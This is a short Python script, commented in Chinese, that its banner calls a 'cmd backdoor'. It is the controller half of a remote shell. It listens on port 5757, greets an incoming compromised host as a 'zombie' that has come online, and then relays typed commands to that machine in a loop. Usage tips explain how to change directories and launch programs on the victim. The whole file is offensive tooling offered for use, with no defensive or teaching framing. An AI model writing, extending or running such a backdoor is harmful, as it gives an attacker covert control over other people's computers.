import socket

print("++++++++++++++++++++")
print("+++python版cmd后门+++")
print("++使用帮助 带目录的>>>不能直接回车++")
print("++不能直接回车，会导致套接字中断+++")
print("++只有>>>可以直接回车+++")
print("++切换目录格式为cd 目录：++")
print("++运行外部程序直接使用start目标程序+++")
print("++未实现异步+++")
print("++++++++++++++++++++")
ip_port =("0.0.0.0",5757)#设置绑定IP和端口
s =socket.socket()#创建套接字实例
s.bind(ip_port)#绑定IP和端口
s.listen(5)
print("等待连接++++++++")
con,addr=s.accept()#监听客户端连接
print(addr,"肉鸡上线！")#打印提示信息

while True:#持续接收发送命令
	dir =con.recv(65365).decode()#获取远程机器工作目录
	p =input(dir+"\>>>").strip()#获取执行的指令
	con.send(p.encode())#将获取到的指令发送给客户端
